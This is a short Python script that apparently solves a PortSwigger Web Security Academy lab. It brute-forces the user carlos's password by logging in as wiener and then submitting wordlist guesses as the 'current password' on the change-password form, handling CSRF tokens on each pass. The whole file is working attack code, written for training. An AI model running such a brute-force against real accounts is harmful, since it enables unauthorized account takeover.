# https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
import requests
import re
import utils

base_url = 'https://ac8f1f4a1fad19d1802185d900f100a3.web-security-academy.net'
csrf = ''
passwords_wordlist = './passwords.txt'

session = requests.Session()

# open passwords wordlist and iterate over lines
with open(passwords_wordlist, 'r') as f:
    for line in f:
        password = line.strip()
        if not password:
            continue

        # login as wiener
        print('login as wiener:peter')

        url = '%s/login' % base_url
        request_response = session.get(url)
        csrf = utils.csrf_from_response_text(request_response.text)

        request_response = session.post(
            url, data='csrf=%s&username=%s&password=%s' % (csrf, 'wiener', 'peter'))

        if 'My account' not in request_response.text:
            exit('failed to login as wiener:peter')

        # go to my account page, get csrf
        print('visit /my-account and get csrf token')

        url = '%s/my-account' % base_url
        request_response = session.get(url)
        csrf = utils.csrf_from_response_text(request_response.text)

        # try change pass on carlos using the password. changing to same pass because less damage
        print('trying pass %s' % password)

        url = '%s/my-account/change-password' % base_url
        post_data = 'csrf={csrf}&username=carlos&current-password={password}&new-password-1={password}&new-password-2={password}'.format(
            csrf=csrf, password=password)

        request_response = session.post(url, data=post_data)

        if 'Password changed successfully!' in request_response.text:
            exit('changed successfully. password is %s' % password)
